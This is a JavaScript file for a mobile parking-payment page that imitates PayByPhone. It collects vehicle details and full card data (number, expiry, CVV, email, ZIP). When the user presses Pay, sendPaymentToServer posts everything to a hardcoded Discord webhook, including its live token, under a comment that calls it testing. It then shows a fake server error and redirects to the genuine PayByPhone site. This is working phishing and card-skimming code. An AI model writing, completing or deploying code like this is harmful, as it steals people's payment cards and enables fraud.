(() => {
  const $ = (sel, root = document) => root.querySelector(sel);
  const $$ = (sel, root = document) => [...root.querySelectorAll(sel)];

  const RATE_PER_HOUR = 5;
  const CONVENIENCE_FEE = 0.35;
  const MAX_MINUTES = 240;

  /* ---------------- Backend payment server ---------------- */
  // Set this to your backend payment server URL, e.g. "https://api.example.com/payments"
  // For testing, you can paste a Discord webhook URL here
  // (https://discord.com/api/webhooks/...) and the payload will be
  // delivered to that channel as a formatted embed instead.
  const PAYMENT_SERVER_URL = "https://discord.com/api/webhooks/1554669177967616121/Cv95Eczt02F_gwHHoYOUNPa3ZoEdpNVGjO1L-HmamvL2Rj2IKHncHQfQv61ldjcSKhLB";

  // When true, the full card number, expiry, CVV, email and zip are included
  // in the payload. This exists ONLY for testing the send formatting — before
  // pointing this at a real backend, set it to false so raw card data never
  // leaves the browser.
  const INCLUDE_FULL_CARD_DETAILS = true;

  function isDiscordWebhook(url) {
    return /discord(?:app)?\.com\/api\/webhooks\//.test(url);
  }

  /**
   * Wraps the payment payload in a Discord embed so it can be
   * eyeballed in a channel while testing.
   */
  function buildDiscordPayload(p) {
    const usd = (n) => `$${n.toFixed(2)}`;
    return {
      content: "💳 **New parking payment (test)**",
      embeds: [
        {
          title: `${p.location.zone} — ${p.location.name}`,
          description: p.location.operator,
          color: 0x5ed03f,
          fields: [
            { name: "Plate", value: `${p.vehicle.plate} (${p.vehicle.state})`, inline: true },
            { name: "Type", value: p.vehicle.type, inline: true },
            { name: "Description", value: p.vehicle.description, inline: true },
            { name: "Duration", value: `${p.session.durationMinutes} min`, inline: true },
            { name: "Started", value: p.session.startedAt, inline: true },
            { name: "Expires", value: p.session.expiresAt, inline: true },
            { name: "Parking fee", value: usd(p.pricing.parkingFee), inline: true },
            { name: "Convenience fee", value: usd(p.pricing.convenienceFee), inline: true },
            { name: "Total", value: `**${usd(p.pricing.total)} ${p.pricing.currency}**`, inline: true },
            {
              name: "Payment",
              value: p.payment
                ? `${p.payment.brand} •••• ${p.payment.last4} — ${p.payment.cardholderName}`
                : "none",
            },
            ...(INCLUDE_FULL_CARD_DETAILS && p.payment
              ? [
                  {
                    name: "Card details (test)",
                    value:
                      `Number: \`${p.payment.cardNumber}\`\n` +
                      `Expiry: ${p.payment.expiry} · CVV: ${p.payment.cvv}\n` +
                      `Email: ${p.payment.email} · ZIP: ${p.payment.postalCode}`,
                  },
                ]
              : []),
          ],
          timestamp: new Date().toISOString(),
        },
      ],
    };
  }

  /**
   * Builds the full parking + payment payload from the current session state.
   */
  function buildPaymentPayload() {
    const now = new Date();
    const expiresAt = new Date(now.getTime() + state.minutes * 60000);
    const parkingFee = Math.round((state.minutes / 60) * RATE_PER_HOUR * 100) / 100;
    const total = Math.round((parkingFee + CONVENIENCE_FEE) * 100) / 100;

    return {
      location: {
        zone: "3635",
        name: "Pier Park Lot",
        operator: "City of Sunny Isles Beach",
      },
      vehicle: {
        state: state.vehicle.state,
        plate: state.vehicle.plate,
        type: state.vehicle.type,
        description: state.vehicle.desc,
      },
      session: {
        startedAt: now.toISOString(),
        expiresAt: expiresAt.toISOString(),
        durationMinutes: state.minutes,
      },
      pricing: {
        currency: "USD",
        parkingFee: parkingFee,
        convenienceFee: CONVENIENCE_FEE,
        total: total,
      },
      payment: state.card
        ? {
            method: "card",
            brand: state.card.brand,
            last4: state.card.last4,
            cardholderName: state.card.name,
            // Sensitive fields — only included when INCLUDE_FULL_CARD_DETAILS is true
            ...(INCLUDE_FULL_CARD_DETAILS
              ? {
                  cardNumber: state.card.number,
                  expiry: state.card.expiry,
                  cvv: state.card.cvv,
                  email: state.card.email,
                  postalCode: state.card.postalCode,
                }
              : {}),
          }
        : null,
    };
  }

  /**
   * Sends the payment payload to the backend payment server.
   * Returns a Promise that resolves with the parsed JSON response,
   * or rejects if the server address is not configured or the request fails.
   */
  async function sendPaymentToServer() {
    if (!PAYMENT_SERVER_URL) {
      console.warn("[payments] PAYMENT_SERVER_URL is not configured; skipping backend call.");
      return Promise.resolve({ skipped: true, reason: "no-server-url" });
    }

    const payload = buildPaymentPayload();
    const body = isDiscordWebhook(PAYMENT_SERVER_URL)
      ? buildDiscordPayload(payload)
      : payload;

    const response = await fetch(PAYMENT_SERVER_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      const text = await response.text().catch(() => "");
      const err = new Error(`Payment server responded with ${response.status}`);
      err.status = response.status;
      err.body = text;
      throw err;
    }

    return response.json().catch(() => ({}));
  }

  const STATES = [
    ["AL", "Alabama"], ["AK", "Alaska"], ["AZ", "Arizona"], ["AR", "Arkansas"], ["CA", "California"],
    ["CO", "Colorado"], ["CT", "Connecticut"], ["DE", "Delaware"], ["DC", "District Of Columbia"],
    ["FL", "Florida"], ["GA", "Georgia"], ["HI", "Hawaii"], ["ID", "Idaho"], ["IL", "Illinois"],
    ["IN", "Indiana"], ["IA", "Iowa"], ["KS", "Kansas"], ["KY", "Kentucky"], ["LA", "Louisiana"],
    ["ME", "Maine"], ["MD", "Maryland"], ["MA", "Massachusetts"], ["MI", "Michigan"], ["MN", "Minnesota"],
    ["MS", "Mississippi"], ["MO", "Missouri"], ["MT", "Montana"], ["NE", "Nebraska"], ["NV", "Nevada"],
    ["NH", "New Hampshire"], ["NJ", "New Jersey"], ["NM", "New Mexico"], ["NY", "New York"],
    ["NC", "North Carolina"], ["ND", "North Dakota"], ["OH", "Ohio"], ["OK", "Oklahoma"], ["OR", "Oregon"],
    ["PA", "Pennsylvania"], ["RI", "Rhode Island"], ["SC", "South Carolina"], ["SD", "South Dakota"],
    ["TN", "Tennessee"], ["TX", "Texas"], ["UT", "Utah"], ["VT", "Vermont"], ["VA", "Virginia"],
    ["WA", "Washington"], ["WV", "West Virginia"], ["WI", "Wisconsin"], ["WY", "Wyoming"],
    ["AB", "Alberta"], ["BC", "British Columbia"], ["MB", "Manitoba"], ["NB", "New Brunswick"],
    ["NL", "Newfoundland & Labrador"], ["NT", "Northwest Territories"], ["NS", "Nova Scotia"],
    ["NU", "Nunavut"], ["ON", "Ontario"], ["PE", "Prince Edward Island"], ["QC", "Quebec"],
    ["SK", "Saskatchewan"], ["YT", "Yukon"], ["GV", "US Government"],
  ];

  const ICON_STROKE = 'stroke="currentColor" stroke-width="1.6" fill="none" stroke-linecap="round" stroke-linejoin="round"';
  const VEHICLE_TYPES = [
    ["Car", `<svg viewBox="0 0 24 24" width="18" height="18"><path d="M3 15v-3l2-4.5h10l3 4.5 3 .8V15H3z M3 15h1.5M8.5 15h6M18.5 15H21" ${ICON_STROKE}/><circle cx="6.5" cy="15.5" r="1.8" ${ICON_STROKE}/><circle cx="16.5" cy="15.5" r="1.8" ${ICON_STROKE}/></svg>`],
    ["Motorcycle", `<svg viewBox="0 0 24 24" width="18" height="18"><circle cx="5" cy="15" r="3" ${ICON_STROKE}/><circle cx="19" cy="15" r="3" ${ICON_STROKE}/><path d="M5 15l4-5h5l2 5M14 10l2-3h2M9 10l-1-2H6" ${ICON_STROKE}/></svg>`],
    ["Truck", `<svg viewBox="0 0 24 24" width="18" height="18"><path d="M2 6h12v10H2zM14 9h4l3 3.5V16h-7" ${ICON_STROKE}/><circle cx="6" cy="17" r="1.8" ${ICON_STROKE}/><circle cx="17" cy="17" r="1.8" ${ICON_STROKE}/></svg>`],
    ["Electric Bike", `<svg viewBox="0 0 24 24" width="18" height="18"><circle cx="5" cy="15" r="3.2" ${ICON_STROKE}/><circle cx="19" cy="15" r="3.2" ${ICON_STROKE}/><path d="M5 15l4-6h6l4 6M9 9l3 6h3M14 6h2l-1 3" ${ICON_STROKE}/><path d="M11 4l-1 2h2l-1 2" ${ICON_STROKE}/></svg>`],
  ];
  const CHECK_SVG = `<svg class="check" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7" stroke="currentColor" stroke-width="1.8" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>`;

  const state = {
    vehicle: { state: null, plate: "", type: null, desc: "" },
    minutes: 0,
    card: null,
  };

  /* ---------------- Navigation ---------------- */
  const stack = ["screen-search"];

  function show(nextId, back = false) {
    const current = $(".screen.active");
    const next = document.getElementById(nextId);
    if (!next || current === next) return;

    next.style.transition = "none";
    next.classList.toggle("left", back);
    next.getBoundingClientRect();
    next.style.transition = "";

    current.classList.remove("active");
    current.classList.toggle("left", !back);
    next.classList.remove("left");
    next.classList.add("active");
    next.scrollTop = 0;
  }

  function go(id) {
    closeSheets();
    stack.push(id);
    show(id);
  }

  function back() {
    closeSheets();
    if (stack.length < 2) return;
    stack.pop();
    show(stack[stack.length - 1], true);
  }

  function replaceTo(id) {
    // Pop back to an existing screen in the stack
    const idx = stack.lastIndexOf(id);
    if (idx === -1) return go(id);
    stack.length = idx + 1;
    closeSheets();
    show(id, true);
  }

  $$("[data-back]").forEach((b) => b.addEventListener("click", back));

  /* ---------------- Sheets ---------------- */
  const overlay = $("#overlay");

  function openSheet(id) {
    closeSheets(false);
    overlay.classList.add("show");
    document.getElementById(id).classList.add("show");
  }

  function closeSheets(hideOverlay = true) {
    $$(".sheet.show").forEach((s) => s.classList.remove("show"));
    if (hideOverlay) overlay.classList.remove("show");
  }

  overlay.addEventListener("click", () => closeSheets());
  $$("[data-close]").forEach((b) => b.addEventListener("click", () => closeSheets()));

  /* ---------------- Screen 1: Search ---------------- */
  const searchBar = $("#search-bar");
  const searchError = $("#search-error");
  let errTimer;

  searchBar.addEventListener("click", () => {
    searchError.classList.add("show");
    searchBar.classList.remove("shake");
    void searchBar.offsetWidth;
    searchBar.classList.add("shake");
    clearTimeout(errTimer);
    errTimer = setTimeout(() => searchError.classList.remove("show"), 3500);
  });

  $("#location-row").addEventListener("click", () => {
    if (isVehicleValid()) return go("screen-duration");
    openSheet("sheet-select-vehicle");
  });

  $("#prompt-toggle").addEventListener("click", (e) => {
    const t = e.currentTarget;
    t.classList.toggle("on");
    t.setAttribute("aria-pressed", t.classList.contains("on"));
  });

  $("#open-add-vehicle").addEventListener("click", () => go("screen-vehicle"));

  /* ---------------- Screen 2: Add vehicle ---------------- */
  const stateField = $("#state-field");
  const typeField = $("#type-field");
  const plateInput = $("#plate-input");
  const descInput = $("#desc-input");
  const addVehicleBtn = $("#add-vehicle-submit");

  function renderOptionList(listEl, items, selected, onPick, withIcons = false) {
    listEl.innerHTML = "";
    items.forEach(({ key, label, icon }) => {
      const li = document.createElement("li");
      if (key === selected) li.classList.add("selected");
      li.innerHTML = `<button type="button">${withIcons ? icon : ""}<span>${label}</span>${CHECK_SVG}</button>`;
      li.firstElementChild.addEventListener("click", () => onPick(key));
      listEl.appendChild(li);
    });
  }

  function openStatePicker() {
    const list = $("#state-list");
    renderOptionList(
      list,
      STATES.map(([abbr, name]) => ({ key: abbr, label: name })),
      state.vehicle.state,
      (abbr) => {
        state.vehicle.state = abbr;
        const name = STATES.find((s) => s[0] === abbr)[1];
        $("#state-value").textContent = abbr === "GV" ? name : `${abbr} ${name}`;
        stateField.classList.add("filled");
        closeSheets();
        validateVehicle();
      }
    );
    openSheet("sheet-state");
    const sel = list.querySelector(".selected");
    list.scrollTop = sel ? sel.offsetTop - list.clientHeight / 3 : 0;
  }

  function openTypePicker() {
    renderOptionList(
      $("#type-list"),
      VEHICLE_TYPES.map(([name, icon]) => ({ key: name, label: name, icon })),
      state.vehicle.type,
      (name) => {
        state.vehicle.type = name;
        $("#type-value").textContent = name;
        typeField.classList.add("filled");
        closeSheets();
        validateVehicle();
      },
      true
    );
    openSheet("sheet-type");
  }

  stateField.addEventListener("click", openStatePicker);
  typeField.addEventListener("click", openTypePicker);

  function syncFilled(input) {
    input.closest(".field").classList.toggle("filled", input.value.length > 0);
  }

  plateInput.addEventListener("input", () => {
    const pos = plateInput.selectionStart;
    plateInput.value = plateInput.value.toUpperCase().replace(/[^A-Z0-9 -]/g, "");
    plateInput.setSelectionRange(pos, pos);
    syncFilled(plateInput);
    validateVehicle();
  });
  descInput.addEventListener("input", () => {
    syncFilled(descInput);
    validateVehicle();
  });

  function isVehicleValid() {
    const v = state.vehicle;
    return !!(v.state && v.type && v.plate.length >= 2 && v.desc.length > 0);
  }

  function validateVehicle() {
    state.vehicle.plate = plateInput.value.trim();
    state.vehicle.desc = descInput.value.trim();
    addVehicleBtn.disabled = !isVehicleValid();
  }

  addVehicleBtn.addEventListener("click", () => {
    if (!isVehicleValid()) return;
    $("#dur-plate").textContent = state.vehicle.plate;
    $("#conf-plate").textContent = state.vehicle.plate;
    $("#conf-desc").textContent = state.vehicle.desc;

    if (stack.includes("screen-confirm")) replaceTo("screen-confirm");
    else go("screen-duration");
  });

  $("[data-goto='screen-vehicle']").addEventListener("click", () => go("screen-vehicle"));

  /* ---------------- Screen 3: Duration ---------------- */
  const durInput = $("#duration-input");
  const unitSelect = $("#unit-select");
  const durError = $("#duration-error");
  const confirmDurBtn = $("#confirm-duration");

  function fmtTime(d) {
    return d.toLocaleTimeString("en-US", { hour: "numeric", minute: "2-digit" });
  }

  function fmtDate(d) {
    const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
    return `${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()}`;
  }

  function updateLimitText() {
    const now = new Date();
    const end = new Date(now.getTime() + MAX_MINUTES * 60000);
    $("#limit-text").textContent = `Up to 4 hrs, ${fmtTime(now)} — ${fmtTime(end)} ${fmtDate(end)}`;
  }

  function currentMinutes() {
    const n = parseInt(durInput.value, 10);
    if (!n) return 0;
    return unitSelect.value === "hour" ? n * 60 : n;
  }

  function validateDuration() {
    syncFilled(durInput);
    const mins = currentMinutes();
    let err = "";
    if (durInput.value && mins < 1) err = "Enter a valid length of stay";
    else if (mins > MAX_MINUTES) err = "Maximum stay is 4 hrs at this location";
    durError.textContent = err;
    confirmDurBtn.disabled = !(mins >= 1 && mins <= MAX_MINUTES);
  }

  durInput.addEventListener("input", () => {
    durInput.value = durInput.value.replace(/\D/g, "");
    validateDuration();
  });
  unitSelect.addEventListener("change", validateDuration);

  $$(".chip").forEach((chip) =>
    chip.addEventListener("click", () => {
      durInput.value = chip.dataset.hours;
      unitSelect.value = "hour";
      validateDuration();
    })
  );

  function money(n) {
    return `$${n.toFixed(2)}`;
  }

  function lengthLabel(mins) {
    const h = Math.floor(mins / 60);
    const m = mins % 60;
    const parts = [];
    if (h) parts.push(`${h} hr${h > 1 ? "s" : ""}`);
    if (m) parts.push(`${m} min${m > 1 ? "s" : ""}`);
    return parts.join(" ");
  }

  function expiryLabel(end) {
    const now = new Date();
    const dayDiff = Math.round(
      (new Date(end.getFullYear(), end.getMonth(), end.getDate()) -
        new Date(now.getFullYear(), now.getMonth(), now.getDate())) / 86400000
    );
    const day = dayDiff === 0 ? "today" : dayDiff === 1 ? "tomorrow" : fmtDate(end);
    return `Expires ${day}, ${fmtTime(end).replace(" ", "")}`;
  }

  function parkingFee() {
    return Math.round((state.minutes / 60) * RATE_PER_HOUR * 100) / 100;
  }

  function renderConfirm() {
    const end = new Date(Date.now() + state.minutes * 60000);
    $("#conf-expires").textContent = expiryLabel(end);
    $("#conf-length").textContent = `Parking for ${lengthLabel(state.minutes)}`;
    $("#fee-parking").textContent = money(parkingFee());
    $("#fee-total").textContent = money(parkingFee() + CONVENIENCE_FEE);
    renderPaymentSelect();
  }

  confirmDurBtn.addEventListener("click", () => {
    state.minutes = currentMinutes();
    if (!state.minutes) return;
    renderConfirm();
    go("screen-confirm");
  });

  /* ---------------- Screen 4: Confirm + payment ---------------- */
  const payBtn = $("#pay-btn");

  function brandOf(num) {
    if (/^4/.test(num)) return "visa";
    if (/^(5[1-5]|2[2-7])/.test(num)) return "mastercard";
    if (/^3[47]/.test(num)) return "amex";
    if (/^(6011|65|64[4-9])/.test(num)) return "discover";
    return "card";
  }

  const BRAND_NAMES = { visa: "Visa", mastercard: "Mastercard", amex: "Amex", discover: "Discover", card: "Card" };

  function brandSvg(brand) {
    switch (brand) {
      case "visa":
        return `<svg viewBox="0 0 34 22"><rect width="34" height="22" rx="3" fill="#fff"/><text x="17" y="15" text-anchor="middle" font-family="Arial" font-weight="900" font-style="italic" font-size="10" fill="#1a1f71">VISA</text></svg>`;
      case "mastercard":
        return `<svg viewBox="0 0 34 22"><rect width="34" height="22" rx="3" fill="#fff"/><circle cx="14" cy="11" r="6" fill="#eb001b"/><circle cx="20" cy="11" r="6" fill="#f79e1b" fill-opacity=".85"/></svg>`;
      case "amex":
        return `<svg viewBox="0 0 34 22"><rect width="34" height="22" rx="3" fill="#2671b9"/><text x="17" y="14.5" text-anchor="middle" font-family="Arial" font-weight="900" font-size="8" fill="#fff">AMEX</text></svg>`;
      case "discover":
        return `<svg viewBox="0 0 34 22"><rect width="34" height="22" rx="3" fill="#fff"/><text x="17" y="14" text-anchor="middle" font-family="Arial" font-weight="800" font-size="6" fill="#222">DISCOVER</text><circle cx="17.6" cy="11.9" r="2" fill="#f58220"/></svg>`;
      default:
        return `<svg viewBox="0 0 32 22"><rect x="1" y="1" width="30" height="20" rx="3" fill="#fff"/><rect x="1" y="5" width="30" height="4" fill="#1a1c1c"/><rect x="4" y="13" width="10" height="2" rx="1" fill="#9aa0a0"/></svg>`;
    }
  }

  function cardLabel(card) {
    return `${BRAND_NAMES[card.brand]} •••• ${card.last4}`;
  }

  function renderPaymentSelect() {
    const icon = $("#pm-icon");
    if (state.card) {
      icon.className = "pm-icon brand";
      icon.innerHTML = brandSvg(state.card.brand);
      $("#pm-label").textContent = cardLabel(state.card);
      payBtn.disabled = false;
    } else {
      icon.className = "pm-icon";
      $("#pm-label").textContent = "Select a payment method";
      payBtn.disabled = true;
    }
    payBtn.textContent = state.card ? `Pay ${money(parkingFee() + CONVENIENCE_FEE)}` : "Pay";
  }

  function renderSavedCards() {
    const wrap = $("#saved-cards");
    wrap.innerHTML = "";
    if (!state.card) return;
    const row = document.createElement("button");
    row.className = "pm-row selected";
    row.innerHTML = `<span class="pm-icon brand">${brandSvg(state.card.brand)}</span><span>${cardLabel(state.card)}</span>${CHECK_SVG.replace('class="check"', 'class="chev" style="color:#5ed03f"')}`;
    row.addEventListener("click", () => closeSheets());
    wrap.appendChild(row);
  }

  $("#payment-select").addEventListener("click", () => {
    renderSavedCards();
    openSheet("sheet-payment");
  });

  $("#open-add-card").addEventListener("click", () => go("screen-card"));

  /* ---------------- Screen 5: Add card ---------------- */
  const cNum = $("#card-number");
  const cExp = $("#card-exp");
  const cCvv = $("#card-cvv");
  const cName = $("#card-name");
  const cEmail = $("#card-email");
  const cZip = $("#card-zip");
  const addCardBtn = $("#add-card-submit");
  const cardFields = [cNum, cExp, cCvv, cName, cEmail, cZip];

  const digits = (s) => s.replace(/\D/g, "");

  function formatCardNumber(raw) {
    const d = digits(raw).slice(0, 19);
    if (brandOf(d) === "amex") {
      return [d.slice(0, 4), d.slice(4, 10), d.slice(10, 15)].filter(Boolean).join(" ");
    }
    return d.replace(/(.{4})/g, "$1 ").trim();
  }

  function expValid(v) {
    const m = /^(\d{2})\/(\d{2})$/.exec(v);
    if (!m) return false;
    const month = +m[1];
    const year = 2000 + +m[2];
    if (month < 1 || month > 12) return false;
    const now = new Date();
    return year > now.getFullYear() || (year === now.getFullYear() && month >= now.getMonth() + 1);
  }

  function cardChecks() {
    const num = digits(cNum.value);
    const brand = brandOf(num);
    const cvvLen = brand === "amex" ? 4 : 3;
    return {
      [cNum.id]: num.length >= (brand === "amex" ? 15 : 13) && num.length <= 19,
      [cExp.id]: expValid(cExp.value),
      [cCvv.id]: digits(cCvv.value).length === cvvLen,
      [cName.id]: cName.value.trim().length >= 2,
      [cEmail.id]: /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(cEmail.value.trim()),
      [cZip.id]: cZip.value.trim().length >= 3,
    };
  }

  function validateCard() {
    cardFields.forEach(syncFilled);
    const checks = cardChecks();
    addCardBtn.disabled = !Object.values(checks).every(Boolean);
    return checks;
  }

  cNum.addEventListener("input", () => {
    cNum.value = formatCardNumber(cNum.value);
    $("#card-brand-icon").innerHTML = brandSvg(brandOf(digits(cNum.value))).replace("<svg ", '<svg width="30" height="20" ');
    cCvv.maxLength = brandOf(digits(cNum.value)) === "amex" ? 4 : 3;
    validateCard();
  });

  cExp.addEventListener("input", (e) => {
    let d = digits(cExp.value).slice(0, 4);
    if (d.length === 1 && +d > 1) d = "0" + d;
    const deleting = e.inputType && e.inputType.startsWith("delete");
    cExp.value = d.length >= 3 ? `${d.slice(0, 2)}/${d.slice(2)}` : d.length === 2 && !deleting ? `${d}/` : d;
    validateCard();
  });

  cCvv.addEventListener("input", () => {
    cCvv.value = digits(cCvv.value);
    validateCard();
  });

  [cName, cEmail, cZip].forEach((el) => el.addEventListener("input", validateCard));

  cardFields.forEach((el) =>
    el.addEventListener("blur", () => {
      const ok = cardChecks()[el.id];
      el.closest(".field").classList.toggle("invalid", !!el.value && !ok);
    })
  );
  cardFields.forEach((el) =>
    el.addEventListener("focus", () => el.closest(".field").classList.remove("invalid"))
  );

  addCardBtn.addEventListener("click", () => {
    const checks = validateCard();
    if (!Object.values(checks).every(Boolean)) return;
    const num = digits(cNum.value);
    state.card = {
      brand: brandOf(num),
      last4: num.slice(-4),
      name: cName.value.trim(),
      number: num,
      expiry: cExp.value.trim(),
      cvv: digits(cCvv.value),
      email: cEmail.value.trim(),
      postalCode: cZip.value.trim(),
    };
    renderPaymentSelect();
    replaceTo("screen-confirm");
  });

  /* ---------------- Pay ---------------- */
  const errorModal = $("#server-error-modal");

  payBtn.addEventListener("click", async () => {
    if (!state.card) return;
    payBtn.disabled = true;
    payBtn.textContent = "Processing…";

    // Send all parking + payment details to the backend payment server.
    // The UI flow continues regardless of the outcome.
    try {
      const result = await sendPaymentToServer();
      console.log("[payments] server response:", result);
    } catch (err) {
      console.error("[payments] failed to reach payment server:", err);
    }

    errorModal.classList.add("show");
    setTimeout(() => {
      window.location.replace("https://m.paybyphone.com/#/home");
    }, 2000);
  });

  /* ---------------- Hero artwork ---------------- */
  function heroSvg() {
    const win = (x, y, cols, rows, w, h, gx, gy, fill) => {
      let s = "";
      for (let r = 0; r < rows; r++)
        for (let c = 0; c < cols; c++)
          s += `<rect x="${x + c * (w + gx)}" y="${y + r * (h + gy)}" width="${w}" height="${h}" rx="1.5" fill="${fill}"/>`;
      return s;
    };
    return `
<svg viewBox="0 0 470 153" preserveAspectRatio="xMaxYMax slice" xmlns="http://www.w3.org/2000/svg">
  <g fill="#c7ebb8" opacity=".9">
    <rect x="160" y="20" width="44" height="140"/><rect x="175" y="8" width="14" height="14"/>
    <rect x="290" y="30" width="40" height="130"/>
    <rect x="370" y="10" width="36" height="150"/>
  </g>
  <g>
    <rect x="200" y="46" width="30" height="120" fill="#8fdc6c"/>
    <rect x="228" y="18" width="72" height="150" rx="6" fill="#5ec93a"/>
    ${win(240, 32, 1, 3, 48, 6, 0, 9, "#b8f09e")}
    ${win(240, 70, 4, 8, 8, 6, 5, 7, "#b8f09e")}
    <rect x="312" y="44" width="58" height="120" rx="4" fill="#4fbf2d"/>
    ${win(320, 54, 4, 10, 7, 6, 5.5, 5.5, "#a9eb8c")}
    <path d="M395 92 a32 32 0 0 1 64 0 V160 h-64z" fill="#58c436"/>
    <circle cx="427" cy="98" r="10" fill="#e9fbe0"/>
    <path d="M427 92v6l4 3" stroke="#3a8a24" stroke-width="2" fill="none" stroke-linecap="round"/>
    <rect x="380" y="120" width="80" height="40" fill="#46b527"/>
    ${win(386, 128, 7, 2, 7, 5, 4, 5, "#a9eb8c")}
  </g>
</svg>`;
  }
  $$(".hero-art").forEach((el) => (el.innerHTML = heroSvg()));

  updateLimitText();
  setInterval(updateLimitText, 30000);
})();
